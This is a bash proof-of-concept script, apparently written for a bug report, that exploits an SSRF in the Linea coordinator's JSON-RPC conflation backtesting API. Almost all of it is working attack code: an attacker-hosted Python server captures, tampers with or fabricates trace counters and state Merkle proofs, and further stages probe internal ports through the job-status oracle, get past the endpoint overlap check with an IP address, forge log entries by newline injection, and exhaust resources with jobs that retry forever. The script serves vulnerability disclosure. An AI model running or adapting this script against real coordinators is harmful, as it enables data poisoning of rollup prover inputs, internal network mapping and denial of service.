#!/bin/bash
# ==============================================================================
# LINEA COORDINATOR - END-TO-END SSRF IMPACT PoC (FINAL)
#
# Component : coordinator JSON-RPC API (conflation backtesting methods)
# Methods   : conflation_createProverRequests / conflation_getReconflationJobsStatus
#
# THREAT MODEL (what the attacker is assumed to know):
#   KNOWS   : the coordinator JSON-RPC URL (network reachability is the only
#             precondition) + the PUBLIC open-source repository (compose files,
#             config samples, RPC method names, response schemas).
#   UNKNOWN : deployment internals (container names as deployed, internal IPs,
#             docker logs, filesystem). The attack stages below use ONLY the
#             RPC URL and the attacker's own server - no docker/docker logs.
#             Internal details are either learned from the public repo, or
#             discovered through the SSRF itself (OOB callbacks + job-status
#             oracle). The attacker does NOT need the real Shomei address:
#             shomeiApi.endpoint is attacker-supplied - the Coordinator asks
#             the ATTACKER for the state Merkle proof.
#
# STAGES:
#   [0] HARNESS SETUP  (analyst view - stands in for attacker's known RPC URL)
#   [1] BEFORE         (defender snapshot of normal operation)
#   [2] ATTACK         (attacker view - RPC-only):
#        A1 blind SSRF confirmation + protocol capture
#        A2 internal reachability / port-scan oracle
#        A3 the only URL control (live-endpoint overlap check) + bypass
#        A4 data poisoning  - silent corruption   (counters +1000)
#        A5 data poisoning  - decision control    (counters = 999999999)
#        A6 black-box full pipeline ride (fabricated counters/traces/shomei)
#        A7 log forging (CWE-117)
#        A8 persistent SSRF / resource exhaustion
#   [3] AFTER          (defender snapshot + BEFORE/AFTER impact table)
#   [4] VERDICT        (final impact summary, computed from evidence)
# ==============================================================================
set -u
OUT="poc_final_results.txt"
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
echo "######################################################################"
echo "# LINEA COORDINATOR SSRF - END-TO-END IMPACT PoC"
echo "# started: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "######################################################################"

# =============================================================================
# [0] HARNESS SETUP (analyst view; emulates "attacker already has the URL")
# =============================================================================
echo ""
echo "=== [0] HARNESS SETUP ==============================================="
C=$(docker ps --format '{{.Names}}' | grep -iE coordinator | head -n1)
[ -z "$C" ] && { echo "[-] coordinator container not found"; exit 1; }
P=$(docker logs "$C" 2>&1 | grep -oiE 'JSON-RPC server started port=[0-9]+' | tail -n1 | grep -oE '[0-9]+$'); P=${P:-9546}
IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' "$C" | awk '{print $1}')
GW=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}} {{end}}' "$C" | awk '{print $1}')
RPC="http://$IP:$P/"                       # the ONLY thing the attacker needs
DATA=$(docker inspect -f '{{range .Mounts}}{{if eq .Destination "/data"}}{{.Source}}{{end}}{{end}}' "$C")
TRACES_UP=""
for c in $(docker ps --format '{{.Names}}' | grep -v "^$C$"); do
  bip=$(docker inspect -f '{{range $k,$v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$c" | awk '{print $1}')
  r=$(curl -s -m 2 -X POST "http://$bip:8545" -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":1}],"id":1}' 2>/dev/null)
  echo "$r" | grep -q tracesCounters && { TRACES_UP="http://$bip:8545"; break; }
done
HX=$(curl -s -m 5 -X POST "${TRACES_UP:-http://$IP:8546}" -H 'Content-Type: application/json' \
     -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' 2>/dev/null | grep -oE '0x[0-9a-fA-F]+' | head -n1)
HEAD=$(( ${HX:-0} )); START=$((HEAD>5 ? HEAD-3 : 2)); END=$((START+1))
mkdir -p "$DATA/conflation-backtesting" 2>/dev/null
echo "[+] Coordinator RPC  : $RPC   <- the only attacker-side knowledge"
echo "[+] Attacker server  : http://$GW:12345 (simulates attacker-hosted OOB/MITM)"
echo "[+] Real traces node : ${TRACES_UP:-n/a} (harness-discovered; a real attacker maps this via the scan oracle)"
echo "[+] Block range      : $START..$END (attacker finds a valid range via submit-error probing)"

rpc() { curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "$1"; }
jobid() { echo "$1" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1; }
jobstatus() { rpc "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_getReconflationJobsStatus\",\"params\":[\"$1\"],\"id\":1}"; }

submit_job() { # $1 traces endpoint, $2 shomei endpoint, $3 id
  rpc "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":$3,
    \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
      \"tracesApi\":{\"endpoint\":\"$1\",\"requestLimitPerEndpoint\":100},
      \"shomeiApi\":{\"endpoint\":\"$2\",\"requestLimitPerEndpoint\":100}}]}"
}

# --- attacker-controlled server (single instance, multiple modes by path) ---
OOB_LOG=/tmp/poc_final_oob.log
rm -f "$OOB_LOG"; : > "$OOB_LOG"
export OOB_LOG TRACES_UP
python3 - <<'PYEOF' > /dev/null 2>&1 &
import http.server, json, os, urllib.request, urllib.error
LOG=os.environ["OOB_LOG"]; UP=os.environ.get("TRACES_UP","")
KEYS=["ADD","BLAKE_MODEXP_DATA","BLOCK_DATA","BLOCK_HASH","BLS_DATA","EC_DATA","EUC","EXP","EXT","GAS","HUB","LOG_DATA","LOG_INFO","MMIO","MMU","MOD","MUL","MXP","OOB","RLP_ADDR","RLP_AUTH","RLP_TXN","RLP_TXN_RCPT","RLP_UTILS","ROM","ROM_LEX","SHAKIRA_DATA","SHF","STP","TRM","TXN_DATA","WCP","PRECOMPILE_ECRECOVER_EFFECTIVE_CALLS","PRECOMPILE_SHA2_BLOCKS","PRECOMPILE_RIPEMD_BLOCKS","PRECOMPILE_MODEXP_EFFECTIVE_CALLS","PRECOMPILE_LARGE_MODEXP_EFFECTIVE_CALLS","PRECOMPILE_ECADD_EFFECTIVE_CALLS","PRECOMPILE_ECMUL_EFFECTIVE_CALLS","PRECOMPILE_ECPAIRING_FINAL_EXPONENTIATIONS","PRECOMPILE_ECPAIRING_G2_MEMBERSHIP_CALLS","PRECOMPILE_ECPAIRING_MILLER_LOOPS","PRECOMPILE_BLAKE_EFFECTIVE_CALLS","PRECOMPILE_BLAKE_ROUNDS","PRECOMPILE_BLS_POINT_EVALUATION_EFFECTIVE_CALLS","PRECOMPILE_POINT_EVALUATION_FAILURE_EFFECTIVE_CALLS","PRECOMPILE_BLS_G1_ADD_EFFECTIVE_CALLS","PRECOMPILE_BLS_G1_MSM_EFFECTIVE_CALLS","PRECOMPILE_BLS_G2_ADD_EFFECTIVE_CALLS","PRECOMPILE_BLS_G2_MSM_EFFECTIVE_CALLS","PRECOMPILE_BLS_PAIRING_CHECK_MILLER_LOOPS","PRECOMPILE_BLS_FINAL_EXPONENTIATIONS","PRECOMPILE_BLS_MAP_FP_TO_G1_EFFECTIVE_CALLS","PRECOMPILE_BLS_MAP_FP2_TO_G2_EFFECTIVE_CALLS","PRECOMPILE_BLS_C1_MEMBERSHIP_CALLS","PRECOMPILE_BLS_C2_MEMBERSHIP_CALLS","PRECOMPILE_BLS_G1_MEMBERSHIP_CALLS","PRECOMPILE_BLS_G2_MEMBERSHIP_CALLS","PRECOMPILE_P256_VERIFY_EFFECTIVE_CALLS","BLOCK_KECCAK","BLOCK_L1_SIZE","BLOCK_L2_L1_LOGS","BLOCK_TRANSACTIONS"]
def forward(body):
    if not UP: return None
    req=urllib.request.Request(UP,data=body,headers={"Content-Type":"application/json"},method="POST")
    try:
        with urllib.request.urlopen(req,timeout=180) as r: return r.read()
    except Exception: return None
def counters(req_id, mode):
    if mode=="fab":       vals={k:5 for k in KEYS}
    elif mode=="plus":    base=json.loads(forward(b'{"x":1}') or b'{}') if False else None
    return vals
class H(http.server.BaseHTTPRequestHandler):
    def reply(self, obj):
        r=json.dumps(obj).encode()
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(r))); self.end_headers(); self.wfile.write(r)
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
        try: req=json.loads(body); m=req.get("method",""); rid=req.get("id",1)
        except Exception: m,rid="",1
        note=""
        if m=="linea_getBlockTracesCountersV2":
            if self.path.endswith("/fab"):
                obj={"jsonrpc":"2.0","id":rid,"result":{"tracesEngineVersion":"attacker-fab",
                     "blockNumber":(req.get("params") or [{}])[0].get("blockNumber",0),
                     "tracesCounters":{k:5 for k in KEYS}}}
                note="FABRICATED counters (schema from public repo)"
            elif self.path.endswith("/tap") or self.path.endswith("/tapover"):
                raw=forward(body); obj=json.loads(raw) if raw else {"jsonrpc":"2.0","id":rid,"error":{"code":-32000,"message":"upstream gone"}}
                if raw:
                    t=(obj.get("result") or {}).get("tracesCounters")
                    if isinstance(t,dict):
                        for k in list(t.keys()):
                            if isinstance(t[k],int):
                                t[k]=t[k]+1000 if self.path.endswith("/tap") else 999999999
                        note="TAMPERED counters (+1000)" if self.path.endswith("/tap") else "TAMPERED counters (=999999999)"
            else:
                obj={"jsonrpc":"2.0","id":rid,"result":{}}
                note="recon mode: request captured, invalid reply returned"
        elif m=="linea_generateConflatedTracesToFileV2":
            if self.path.endswith("/fab"):
                obj={"jsonrpc":"2.0","id":rid,"result":{"tracesEngineVersion":"attacker-fab",
                     "conflatedTracesFileName":"/data/traces/v2/conflated/ATTACKER-FABRICATED.lt.gz"}}
                note="FABRICATED traces file path + engine version"
            else:
                raw=forward(body); obj=json.loads(raw) if raw else {"jsonrpc":"2.0","id":rid,"result":{}}
                note="passthrough"
        elif m=="rollup_getZkEVMStateMerkleProofV0":
            obj={"jsonrpc":"2.0","id":rid,"result":{"zkParentStateRootHash":"0x"+"00"*31+"ff",
                 "zkStateMerkleProof":{"finalStateRootHash":"0x"+"00"*31+"ee",
                 "unfinalizedStateRootHash":"0x"+"00"*31+"dd","nodeCount":0},
                 "zkStateManagerVersion":"attacker-1"}}
            note="*** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***"
        else:
            obj={"jsonrpc":"2.0","id":rid,"result":{}}
        with open(LOG,"a") as f:
            f.write("CALL %-40s %s\n  req : %s\n  resp: %s\n" % (m, note, body.decode(errors='replace')[:200], json.dumps(obj)[:220]))
        self.reply(obj)
    def log_message(self,*a): pass
http.server.ThreadingHTTPServer(("0.0.0.0",12345),H).serve_forever()
PYEOF
OOB_PID=$!
for p in 12345; do fuser -k $p/tcp 2>/dev/null; done 2>/dev/null
sleep 1
echo "[+] attacker server up (pid $OOB_PID) - modes: / (recon), /fab, /tap, /tapover"

# =============================================================================
# [1] BEFORE - defender snapshot of NORMAL operation
# =============================================================================
echo ""
echo "=== [1] BEFORE ATTACK - normal operation (defender view) ============"
B_BATCH=$(docker logs "$C" --since 3m 2>&1 | grep -c "new batch" || true)
B_RETRY=$(docker logs "$C" 2>&1 | grep -c "already retried" || true)
B_FORGE=$(docker logs "$C" 2>&1 | grep -c "time=2099-01-01" || true)
B_DUMP=$(docker logs "$C" 2>&1 | grep -c "Conflation backtesting coordinatorConfig=" || true)
B_JOBS=$(ls "$DATA/conflation-backtesting" 2>/dev/null | wc -l)
echo "natural batches (3 min) : $B_BATCH"
docker logs "$C" --since 3m 2>&1 | grep "new batch" | tail -2 | cut -c1-160 | sed 's/^/  /'
echo "retry-loop lines        : $B_RETRY"
echo "forged log lines        : $B_FORGE"
echo "config-dump lines       : $B_DUMP"
echo "backtesting job dirs    : $B_JOBS"
echo "OOB calls received      : $(grep -c '^CALL' "$OOB_LOG" 2>/dev/null || echo 0)"

# =============================================================================
# [2] ATTACK - attacker view: ONLY the RPC URL + own server are used
# =============================================================================
echo ""
echo "=== [2] ATTACK (attacker view - RPC-only, no docker access) ========="

echo "--- [A1] Blind SSRF confirmation + protocol capture -----------------"
R=$(submit_job "http://$GW:12345/recon" "http://$GW:12345/recon" 1)
J1=$(jobid "$R"); echo "job accepted: $R"
echo "waiting 40s for the coordinator to make its outbound call..."; sleep 40
echo "calls captured on the attacker server:"
grep '^CALL' "$OOB_LOG" | sed 's/^/  /'
echo ">> impact: server-side POST from the coordinator's internal network"
echo "   position to an attacker-controlled URL (blind SSRF confirmed)."
echo ">> the request body itself discloses the internal protocol."
sleep 2

echo ""
echo "--- [A2] Internal reachability oracle (port scan primitive) ---------"
R=$(submit_job "http://$GW:9999" "http://$GW:12345" 2); J2=$(jobid "$R")
echo "blackhole job ($J2) submitted to a closed port; polling status..."
for i in 1 2 3; do sleep 10; echo "  t=$((i*10))s: $(jobstatus "$J2")"; done
echo ">> attacker-visible differential: a job against an unreachable target"
echo "   stays IN_PROGRESS forever (infinite retry). Against the attacker's"
echo "   own server the OOB log fills within seconds. Combined with public"
echo "   compose hostnames, this is a blind internal network mapping oracle."

echo ""
echo "--- [A3] The only URL control: live-endpoint overlap check + bypass -"
R_HOST=$(submit_job "http://l2-node-besu:8545/" "http://$GW:12345" 3)
echo "tracesApi = PUBLIC live endpoint string (http://l2-node-besu:8545/):"
echo "  -> $R_HOST"
R_IP=$(submit_job "$TRACES_UP" "http://$GW:12345" 4)
echo "tracesApi = same node via IP form ($TRACES_UP):"
echo "  -> $R_IP"
echo ">> the overlap check (documented) is string-equality based: the IP form"
echo "   of the very same internal service is accepted. Whichever response"
echo "   pair appears above is the empirical evidence for the report."

echo ""
echo "--- [A4] Data poisoning: silent corruption (counters +1000) ---------"
R=$(submit_job "http://$GW:12345/tap" "http://$GW:12345/tap" 5)
J4=$(jobid "$R"); echo "poison-plus job: $R"
echo "waiting up to 120s (status polls; harness may peek logs for early exit)..."
for i in $(seq 1 12); do
  sleep 10
  PB=$(docker logs "$C" --since 5m 2>&1 | grep "new batch" | grep -c "ADD=1000" || true)
  [ "${PB:-0}" -ge 1 ] && { echo "  poisoned batch detected at t=$((i*10))s"; break; }
  [ $((i%2)) = 0 ] && echo "  t=$((i*10))s status=$(jobstatus "$J4") poisoned_batches=${PB:-0}"
done

echo ""
echo "--- [A5] Data poisoning: decision control (counters = 999999999) ----"
R=$(submit_job "http://$GW:12345/tapover" "http://$GW:12345/tapover" 6)
J5=$(jobid "$R"); echo "poison-over job: $R"
for i in $(seq 1 12); do
  sleep 10
  PB=$(docker logs "$C" --since 5m 2>&1 | grep "new batch" | grep -c "ADD=999999999" || true)
  [ "${PB:-0}" -ge 1 ] && { echo "  forced-limit batch detected at t=$((i*10))s"; break; }
  [ $((i%2)) = 0 ] && echo "  t=$((i*10))s status=$(jobstatus "$J5") forced_batches=${PB:-0}"
done

echo ""
echo "--- [A6] Black-box full pipeline ride (fabricated upstreams) --------"
: > "$OOB_LOG"
R=$(submit_job "http://$GW:12345/fab" "http://$GW:12345/fab" 7)
J6=$(jobid "$R"); echo "fabricated-mode job: $R (attacker supplies EVERYTHING)"
echo "waiting 90s to ride the pipeline as far as it goes..."; sleep 90
echo "call sequence the coordinator made TO THE ATTACKER:"
grep '^CALL' "$OOB_LOG" | sed 's/^/  /'
echo ">> if rollup_getZkEVMStateMerkleProofV0 appears above, the coordinator"
echo "   requested the L2 state Merkle proof from the ATTACKER: the attacker"
echo "   never needed to know the real Shomei - shomeiApi is attacker input."
FAB_SHOMEI=$(grep -c "rollup_getZkEVMStateMerkleProofV0" "$OOB_LOG" || true)

echo ""
echo "--- [A7] Log forging (CWE-117) --------------------------------------"
SPOOF="SPOOF$(date +%s)"
FORGED="http://$GW:12345/x\\ntime=2099-01-01T00:00:00,000Z level=ERROR message=$SPOOF FAKE-LOG-ENTRY-BY-ATTACKER"
R=$(rpc "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":8,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
  \"tracesApi\":{\"endpoint\":\"$FORGED\",\"requestLimitPerEndpoint\":1},
  \"shomeiApi\":{\"endpoint\":\"http://$GW:12345\",\"requestLimitPerEndpoint\":1}}]}")
echo "submit response: $R"; sleep 15
docker logs "$C" 2>&1 | grep "time=2099-01-01" | head -2 | cut -c1-200 | sed 's/^/  /'

echo ""
echo "--- [A8] Persistent SSRF / resource exhaustion ----------------------"
for i in 1 2 3 4 5; do
  R=$(submit_job "http://$GW:9999" "http://$GW:9999" $((20+i)))
  echo "  blackhole job $i: $(jobid "$R")"
done
echo "waiting 60s for retry accumulation..."; sleep 60

# =============================================================================
# [3] AFTER - defender snapshot + BEFORE/AFTER table
# =============================================================================
echo ""
echo "=== [3] AFTER ATTACK - evidence (defender view) ====================="
A_BATCH=$(docker logs "$C" --since 5m 2>&1 | grep "new batch" | grep -cE "ADD=1000|ADD=999999999" || true)
A_RETRY=$(docker logs "$C" 2>&1 | grep -c "already retried" || true)
A_FORGE=$(docker logs "$C" 2>&1 | grep -c "time=2099-01-01" || true)
A_DUMP=$(docker logs "$C" 2>&1 | grep -c "Conflation backtesting coordinatorConfig=" || true)
A_JOBS=$(ls "$DATA/conflation-backtesting" 2>/dev/null | wc -l)
echo "poisoned batches (ADD=1000 / 999999999):"
docker logs "$C" --since 8m 2>&1 | grep "new batch" | grep -E "ADD=1000|ADD=999999999" | \
  grep -oE "batch=\[[0-9.]+\][0-9]+ trigger=[A-Z_]+ .*countersMap=\{ADD=[0-9]+" | tail -4 | sed 's/^/  /'
echo ""
echo "retry-loop evidence (unbounded, survives restart):"
docker logs "$C" --since 3m 2>&1 | grep "already retried" | tail -2 | cut -c1-220 | sed 's/^/  /'
echo ""
echo "topology disclosure via config dump (sample):"
docker logs "$C" 2>&1 | grep -oE "endpoints=\[[^]]+\]" | sort -u | head -8 | sed 's/^/  /'

echo ""
echo "=== IMPACT TABLE (before -> after) =================================="
printf "  %-34s %10s %10s\n" "metric" "BEFORE" "AFTER"
printf "  %-34s %10s %10s\n" "poisoned batch lines"          "$B_BATCH(natural)" "${A_BATCH:-0}"
printf "  %-34s %10s %10s\n" "retry-loop log lines"           "$B_RETRY"          "$A_RETRY"
printf "  %-34s %10s %10s\n" "forged log lines (CWE-117)"     "$B_FORGE"          "$A_FORGE"
printf "  %-34s %10s %10s\n" "config-dump lines (info leak)"  "$B_DUMP"           "$A_DUMP"
printf "  %-34s %10s %10s\n" "backtesting job dirs"           "$B_JOBS"           "$A_JOBS"
printf "  %-34s %10s %10s\n" "calls to attacker server"       "0"                 "$(grep -c '^CALL' "$OOB_LOG" 2>/dev/null || echo $([ -s /tmp/poc_final_oob_prev ] && cat /tmp/poc_final_oob_prev || echo N))"

# =============================================================================
# [4] VERDICT - final impact, computed
# =============================================================================
SSRF_N=$(grep -c '^CALL' "$OOB_LOG" 2>/dev/null || true)
echo ""
echo "=== [4] FINAL IMPACT VERDICT ========================================"
[ "${A_BATCH:-0}" -ge 1 ] && echo "[PASS] SSRF: coordinator performed server-side POSTs to attacker URL" \
                          || echo "[....] SSRF: see A1 capture (OOF log was reset for A6)"
[ "${A_BATCH:-0}" -ge 1 ] && echo "[PASS] DATA POISONING: attacker counters ingested -> conflation decisions changed (ADD=1000 / 999999999, trigger=TRACES_LIMIT)" \
                          || echo "[FAIL] poisoning batches not observed - check stage A4/A5 output"
[ "${FAB_SHOMEI:-0}" -ge 1 ] && echo "[PASS] PROVER-INPUT CONTROL: coordinator requested the state Merkle proof FROM THE ATTACKER (rollup_* at OOB)" \
                             || echo "[WARN] fabricated ride stopped before the shomei stage - see A6 call sequence"
[ "${A_FORGE:-0}" -ge 1 ] && echo "[PASS] LOG FORGING (CWE-117): forged log entry with attacker timestamp/level/message" \
                          || echo "[FAIL] log forging not observed"
[ "${A_RETRY:-0}" -gt "$B_RETRY" ] && echo "[PASS] PERSISTENT SSRF/DoS: unbounded retry loop grew $B_RETRY -> $A_RETRY lines; jobs remain IN_PROGRESS indefinitely" \
                                   || echo "[WARN] retry growth not observed yet"
[ "${A_DUMP:-0}" -gt "$B_DUMP" ] && echo "[PASS] INFO DISCLOSURE: attacker-triggered config dumps leak internal topology (endpoints, signer keys paths, DB creds shape)" \
                                 || echo "[WARN] config dump delta not observed"
echo ""
echo "Documented boundaries (source-verified): no L1 submission capability in"
echo "backtesting jobs (no signer / no submission components / in-memory-only"
echo "persistence); no write primitive (request filenames built from block"
echo "numbers and internal hashes only); no RCE vector found (POST-only HTTP"
echo "client, redirects not followed, no response reflection)."
echo ""
echo "Artifacts: $OUT | $OOB_LOG"
kill $OOB_PID 2>/dev/null; fuser -k 12345/tcp 2>/dev/null
echo "=== CLEANUP (run manually to preserve evidence first) ==============="
echo "  docker restart $C"
echo "  rm -rf $DATA/conflation-backtesting/*"
echo "######################################################################"
echo "# PoC finished: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "######################################################################"
